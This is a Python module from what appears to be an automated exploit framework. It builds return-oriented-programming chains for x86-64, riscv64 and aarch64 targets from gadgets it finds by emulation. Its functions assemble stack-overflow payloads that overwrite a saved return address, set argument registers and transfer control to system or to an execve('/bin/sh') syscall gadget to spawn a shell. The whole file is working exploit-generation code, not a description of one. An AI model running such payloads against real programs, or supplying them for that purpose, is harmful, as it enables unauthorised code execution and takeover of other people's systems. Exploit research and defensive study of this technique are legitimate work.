"""ROP-chain SOLVER: turn the semantic gadget engine's effect inventory into a concrete stack
payload that sets a chosen register state and transfers control to a chosen address (a syscall site,
a function, a `system`). Where the pattern-matched builders assume a fixed gadget shape, this
composes from WHATEVER clean register-control gadgets the target actually has -- discovered by
`gadget_emu` (emulation, so the effects are real, not inferred).

Soundness: the solver only emits a chain; it never claims the chain WORKS. The caller detonates it
and confirms the effect (a spawned shell, a written marker, a reached breakpoint) with a negative
control, exactly as every other lykos exploit is confirmed. A chain built on a wrong gadget simply
fails to confirm.

Scope here: STACK-POPPING arches (x86-64), where a register setter is a `pop <reg>; ret` and the
chain is the classic contiguous layout -- each gadget's `ret` pops the next gadget's address off the
stack. Link-register arches (riscv/aarch64, where `ret`=`jr ra` and every link must restore ra) need
the ordered ra-threading variant; this module reports honestly (returns None) for an arch whose
setters are not stack-pop, rather than emit a layout that cannot chain.
"""
from __future__ import annotations

from . import gadget_emu

# Callee-saved GPRs per link-register arch -- the registers a function epilogue (the LOADER) restores
# from the overflow, hence the ones a chain can set and a `mv a0,sS; jr sB` caller can source from.
_CALLEE = {
    "riscv64": {f"x{i}" for i in (8, 9, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27)},
    "riscv": {f"x{i}" for i in (8, 9, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27)},
    "aarch64": {f"x{i}" for i in range(19, 29)},
}


def _pop_setters(gadgets, reg):
    """Clean stack-pop setters for `reg`: term `ret`, reg loaded from the stack, smallest sp-adjust
    first (fewest incidental pops to pad around)."""
    out = [g for g in gadgets
           if g.get("term") == "ret" and str(g["effects"].get(reg, "")).startswith("stack@")]
    out.sort(key=lambda g: g["spadj"])
    return out


def solve_reg_chain(data: bytes, arch: str, *, sets: dict, final_va: int, offset: int,
                    word: int = 8, segments=None, max_insns: int = 4, pad: bytes = b"A"):
    """Synthesize a stack payload that sets each register in `sets` ({regname: value}) via clean
    stack-pop gadgets, then transfers to `final_va`.

    Returns {"payload": bytes, "chain": [(gadget_va, reg, value)], "final": final_va} or None when a
    requested register has no clean pop setter (the honest "cannot compose" answer) or the arch is
    not stack-popping / the engine is unavailable."""
    if not gadget_emu.available() or not gadget_emu.arch_supported(arch):
        return None
    if segments is None:
        # Derive the executable segments WITH their real vaddrs so gadget VAs are ABSOLUTE (a
        # file-offset VA would not match final_va / a loaded address). Without this a no-PIE target's
        # gadgets come back at file offsets and the chain jumps nowhere.
        from .rop import _loads
        segments = [(o, s, v) for o, s, v, fl in _loads(data) if fl & 1] or None
    want = tuple(sets)
    gadgets = gadget_emu.find_reg_control_gadgets(
        data, arch, want=want, segments=segments, max_insns=max_insns,
        max_results=400000, scan_cap=40_000_000)
    chosen = {}
    for reg in sets:
        setters = _pop_setters(gadgets, reg)
        if not setters:
            return None                                   # no clean setter -> cannot compose (honest)
        chosen[reg] = setters[0]

    def p(v):
        return (v & ((1 << (word * 8)) - 1)).to_bytes(word, "little")

    body = bytearray()
    chain = []
    for reg, val in sets.items():
        g = chosen[reg]
        n = int(g["effects"][reg].split("@")[1])          # stack offset the pop loads `reg` from
        span = g["spadj"]                                 # bytes this gadget pops before its `ret`
        region = bytearray((pad * ((span // len(pad)) + 1))[:span])
        region[n:n + word] = p(val)                       # the value the pop loads into `reg`
        body += p(g["va"]) + region                       # gadget addr, then its popped region
        chain.append((g["va"], reg, val))
    body += p(final_va)                                   # the final `ret` transfers here
    payload = pad * ((offset // len(pad)) + 1)
    payload = bytearray(payload[:offset]) + body
    return {"payload": bytes(payload), "chain": chain, "final": final_va}


def solve_lr_chain(data: bytes, arch: str, *, set_a0: int, call_va: int, offset: int,
                   segments=None, max_insns: int = 16, max_candidates: int = 60,
                   stack_range=(8, 168, 8), word: int = 8):
    """Link-register chain (riscv64 / aarch64): set a0 = `set_a0` and transfer control to `call_va`,
    via a LOADER (an epilogue that restores callee-saved regs + the return register from the overflow,
    then `ret`) feeding a CALLER (`mv a0,sS; jr sB`). On these arches `ret`=`jr ra`, so the loader's
    restored ra is what reaches the caller; the caller's branch register is the final hop.

    Composed from gadgets DISCOVERED by gadget_emu (emulated effects): a caller is a gadget whose a0
    becomes a callee-saved reg and whose terminator is `jr:<that-or-another callee-saved reg>`; a
    loader is a ret-terminated gadget that loads the caller's source + branch regs AND ra from the
    stack. The loader's entry sp lands at an offset in the overflow that the vulnerable frame decides,
    so this returns CANDIDATE payloads over that position for the caller to confirm (detonate +
    negative control). Returns a list of {payload, caller, loader, stack_pos, sS, sB, a0_off}
    (newest-compact first; a0_off = the buffer offset of the bytes feeding a0, for a cheap negative
    control), or [] when no loader+caller composes -- the honest 'cannot compose on this target'.

    One register only (a0). execve needs a1=a2=0 too; those need ra-restoring zeroing gadgets for
    a1/a2, which are arch/target-dependent (riscv libc lacks a clean a2/envp one) -- a multi-register
    extension. a one-argument target (system("/bin/sh")) needs only this."""
    arch = (arch or "").lower()
    callee = _CALLEE.get(arch)
    if callee is None or not gadget_emu.available():
        return []
    if segments is None:
        from .rop import _loads
        segments = [(o, s, v) for o, s, v, fl in _loads(data) if fl & 1] or None

    # CALLERS (mv a0,sS; jr sB) and ret-terminated callee-saved LOADERS (ra + the caller's {sS,sB}
    # restored from the stack) -- discovered by gadget_emu via the shared helpers the execve variant
    # also uses. A loader needs both sS and sB, so requiring >=2 callee-saved slots up front only drops
    # loaders no caller could pair with.
    callers = _lr_callers(data, arch, callee, segments, max_candidates)
    loaders = _lr_value_loaders(data, arch, callee, segments, max_insns, max_candidates)

    def p(v):
        return (v & ((1 << (word * 8)) - 1)).to_bytes(word, "little")

    out = []
    for cva, sS, sB in callers:
        for ld in loaders:
            if sS not in ld["regoff"] or sB not in ld["regoff"]:
                continue                                           # loader must set both source+branch
            for sp in range(*stack_range):
                tot = sp + max(ld["regoff"][sS], ld["regoff"][sB], ld["raoff"]) + 2 * word
                buf = bytearray(b"A" * tot)
                a0_off = sp + ld["regoff"][sS]                     # buffer bytes that FEED a0 (=&sh)
                buf[offset:offset + word] = p(ld["va"])            # overwritten saved ra -> loader
                buf[a0_off:a0_off + word] = p(set_a0)              # sS = &"/bin/sh"
                buf[sp + ld["regoff"][sB]:sp + ld["regoff"][sB] + word] = p(call_va)  # sB = target
                buf[sp + ld["raoff"]:sp + ld["raoff"] + word] = p(cva)                # ra -> caller
                out.append({"payload": bytes(buf), "caller": cva, "loader": ld["va"],
                            "stack_pos": sp, "sS": sS, "sB": sB, "a0_off": a0_off})
                if len(out) >= max_candidates:
                    return out
    return out


def _lr_callers(data, arch, callee, segments, max_candidates, preserve=()):
    """The `mv a0,sS; (jr|br) sB` callers (sS,sB callee-saved; spadj 0 so sp survives) that both
    solve_lr_chain-style chains branch through -- shared so the execve variant discovers them the same
    way. With `preserve` (e.g. ("a1","a2")) only callers CERTIFIED to leave those registers untouched
    are returned -- the execve chain needs the caller not to clobber the argv/envp it set. Returns
    [(va, sS, sB)]."""
    need = set(preserve)
    gc = gadget_emu.find_reg_control_gadgets(data, arch, want=("a0",), segments=segments,
                                             max_insns=6, max_results=max_candidates * 20,
                                             scan_cap=120_000_000, preserve=preserve)
    out = []
    for g in gc:
        a0 = g["effects"].get("a0", "")
        if not (a0.startswith("reg:") and g["term"].startswith("jr:") and g.get("spadj", 0) == 0):
            continue
        if need and not need <= set(g.get("preserved", ())):
            continue
        sS, sB = a0.split(":", 1)[1], g["term"].split(":", 1)[1]
        if sS in callee and sB in callee and sS != sB:
            out.append((g["va"], sS, sB))
    return out


def _lr_value_loaders(data, arch, callee, segments, max_insns, max_candidates, need=2):
    """The ret-terminated callee-saved LOADERS (ra<-stack, >=`need` callee-saved <-stack) that stage
    sS=&binsh / sB=target and thread ra -- shared with the execve variant. Returns [{va,regoff,raoff,
    spadj}]."""
    gl = gadget_emu.find_reg_control_gadgets(data, arch, want=tuple(callee) + ("ra",),
                                             segments=segments, max_insns=max_insns,
                                             max_results=max_candidates * 40, scan_cap=200_000_000)
    out = []
    for g in gl:
        ra = g["effects"].get("ra", "")
        if g["term"] != "ret" or not ra.startswith("stack@"):
            continue
        regoff = {r: int(v.split("@")[1]) for r, v in g["effects"].items()
                  if r in callee and v.startswith("stack@")}
        if len(regoff) >= need:
            out.append({"va": g["va"], "raoff": int(ra.split("@")[1]), "spadj": g["spadj"],
                        "regoff": regoff})
    return out


def solve_lr_execve_chain(data: bytes, arch: str, *, binsh: int, gateway: int, offset: int,
                          segments=None, max_insns: int = 20, max_candidates: int = 120,
                          base_span: int = 160, word: int = 8):
    """execve("/bin/sh", NULL, NULL) via a MULTI-REGISTER ra-threaded chain on the link-register arches
    (riscv64 / aarch64) -- the multi-register extension of solve_lr_chain. Where `system` needs only
    a0, execve needs a0=&binsh, a1=0 (argv), a2=0 (envp) AND the syscall `gateway` (libc's `mov x8,#221;
    svc` / `li a7,221; ecall`). Composition, all ra-threaded (`ret`=`jr ra`/`ret x30`):

      L0 (arg-zeroing loader): a ret-terminated epilogue that sets a1 and a2 -- to 0, or from stack
         slots we fill with 0 -- and restores ra from the stack (-> LB). a1/a2 are caller-saved, so
         they are set FIRST and nothing after L0 writes them: LB only touches callee-saved regs + ra,
         the caller only a0, so a1=a2=0 survive to the syscall.
      LB (value loader): the same callee-saved loader solve_lr_chain uses -- sets sS=&binsh, sB=gateway
         and ra -> the caller.
      caller: `mv a0,sS; (jr|br) sB` with sB=gateway -> a0=&binsh and branch to the gateway.

    LB's entry sp is swept over the overflow (starting at offset+word, where the vulnerable frame's
    `ret` leaves sp, so the real position is tried FIRST -- a sliced build_exploit reaches the
    confirming candidate before its deadline instead of after an absolute 8.. sweep); L0's entry sp is
    LB's + LB's spadj (the post-index). All gadgets are DISCOVERED by gadget_emu (emulated effects), so
    a1/a2 being cleanly zeroable in a ra-restoring gadget is a MEASURED fact, not an assumption.
    Returns candidate payloads
    {payload, l0, lb, caller, base, sS, sB, a0_off}, or [] when NO arg-zeroing loader exists -- the
    honest decline the riscv a2/envp scarcity produces (there a2 is reachable only as a2<-a0, never
    cleanly zeroed in a ret-terminated gadget), proven by emulation rather than asserted."""
    arch = (arch or "").lower()
    callee = _CALLEE.get(arch)
    if callee is None or not gadget_emu.available() or not (binsh and gateway):
        return []
    if segments is None:
        from .rop import _loads
        segments = [(o, s, v) for o, s, v, fl in _loads(data) if fl & 1] or None

    # Callers must leave a1/a2 untouched (set before the caller runs); the engine certifies it. Kept on
    # their OWN short scan (max_insns=6): a caller is `mv a0,sS; jr sB` with spadj 0, and a longer
    # window would let a richer-but-sp-touching gadget win the same `jr` and disqualify it.
    callers = _lr_callers(data, arch, callee, segments, max_candidates, preserve=("a1", "a2"))

    # The two LOADER classes share ONE scan of the image, then split by effects -- not two. Scanning a
    # static libc (~1MB exec) separately for value and arg loaders with the sound engine (multi-seed +
    # control-flow decode) overran the autopilot's build_exploit time slice; one pass over the
    # ret-terminated epilogues, classified below, fits it. Preserve the callee-saved regs so an arg
    # loader that clobbers the staged sS/sB is rejected.
    loaders = gadget_emu.find_reg_control_gadgets(
        data, arch, want=("a1", "a2", "ra") + tuple(callee), segments=segments, max_insns=max_insns,
        max_results=max_candidates * 60, scan_cap=200_000_000, preserve=tuple(callee))
    value_loaders, arg_loaders = [], []
    for g in loaders:
        e = g["effects"]
        ra = e.get("ra", "")
        if g["term"] != "ret" or not ra.startswith("stack@"):
            continue
        raoff = int(ra.split("@")[1])
        # VALUE LOADER (LB): >=2 callee-saved <- stack (stages sS=&binsh, sB=gateway) + ra <- stack.
        regoff = {r: int(v.split("@")[1]) for r, v in e.items()
                  if r in callee and v.startswith("stack@")}
        if len(regoff) >= 2:
            value_loaders.append({"va": g["va"], "raoff": raoff, "spadj": g["spadj"],
                                  "regoff": regoff})
        # ARG-ZEROING LOADER (L0): a1 AND a2 clean (zero verified across seedings, or stack), ra <-
        # stack, and the callee-saved regs preserved (so sS/sB survive it).
        a1, a2 = e.get("a1", ""), e.get("a2", "")
        if (a1 == "zero" or a1.startswith("stack@")) and (a2 == "zero" or a2.startswith("stack@")):
            arg_loaders.append({"va": g["va"], "spadj": g["spadj"], "raoff": raoff,
                                "a1": None if a1 == "zero" else int(a1.split("@")[1]),
                                "a2": None if a2 == "zero" else int(a2.split("@")[1]),
                                "keep": set(g.get("preserved", ()))})
    if not (arg_loaders and value_loaders and callers):
        return []                        # honest 'cannot compose' (riscv a2 wall -> no arg_loaders)

    def p(v):
        return (v & ((1 << (word * 8)) - 1)).to_bytes(word, "little")

    def _span(l, extra):
        return max([l["raoff"], l["spadj"]] + extra)
    arg_loaders.sort(key=lambda l: _span(l, [o for o in (l["a1"], l["a2"]) if o is not None]))
    value_loaders.sort(key=lambda l: _span(l, list(l["regoff"].values())))

    # ORDER: LB first (stage the callee-saved sS/sB + ra), L0 LAST (zero a1/a2). a1/a2 are
    # caller-saved, so the arg-zeroing must be the last write before the gateway: nothing after L0
    # touches them (the caller only sets a0). Running L0 first instead lets LB's epilogue clobber a1/a2
    # on its way through -- the bug that left x2 non-zero. L0 may only clobber a1/a2/ra/x29/x30, so
    # the callee-saved sS/sB LB staged survive it; the breakpoint confirm (x0=binsh AND x1=x2=0)
    # rejects any L0 that does disturb them.
    out = []
    for LB in value_loaders[:8]:
        for cva, sS, sB in callers:
            if sS not in LB["regoff"] or sB not in LB["regoff"]:
                continue
            for L0 in arg_loaders[:6]:                    # compact arg-zeroing loaders first
                if sS not in L0["keep"] or sB not in L0["keep"]:
                    continue                              # L0 must not clobber the sS/sB LB staged
                # LB's entry sp lands at offset+word after the vulnerable `ret`; sweep from there (real
                # position first) so the confirming candidate is reached early under a time slice.
                for base in range(offset + word, offset + word + base_span, word):
                    l0_base = base + LB["spadj"]           # L0's entry sp = LB's + its post-index
                    a0_off = base + LB["regoff"][sS]
                    far = max([base + LB["regoff"][sS], base + LB["regoff"][sB], base + LB["raoff"],
                               l0_base + L0["raoff"]]
                              + [l0_base + o for o in (L0["a1"], L0["a2"]) if o is not None])
                    buf = bytearray(b"A" * (max(offset, far) + 2 * word))
                    buf[offset:offset + word] = p(LB["va"])               # saved ra -> LB
                    buf[a0_off:a0_off + word] = p(binsh)                  # sS = &"/bin/sh"
                    bo = base + LB["regoff"][sB]
                    buf[bo:bo + word] = p(gateway)                        # sB = gateway
                    buf[base + LB["raoff"]:base + LB["raoff"] + word] = p(L0["va"])   # LB ra -> L0
                    if L0["a1"] is not None:
                        buf[l0_base + L0["a1"]:l0_base + L0["a1"] + word] = p(0)      # a1 = 0 (argv)
                    if L0["a2"] is not None:
                        buf[l0_base + L0["a2"]:l0_base + L0["a2"] + word] = p(0)      # a2 = 0 (envp)
                    ro = l0_base + L0["raoff"]
                    buf[ro:ro + word] = p(cva)                            # L0 ra -> caller (mv a0,sS; jr sB)
                    out.append({"payload": bytes(buf), "l0": L0["va"], "lb": LB["va"], "caller": cva,
                                "base": base, "sS": sS, "sB": sB, "a0_off": a0_off})
                    if len(out) >= max_candidates:
                        return out
    return out
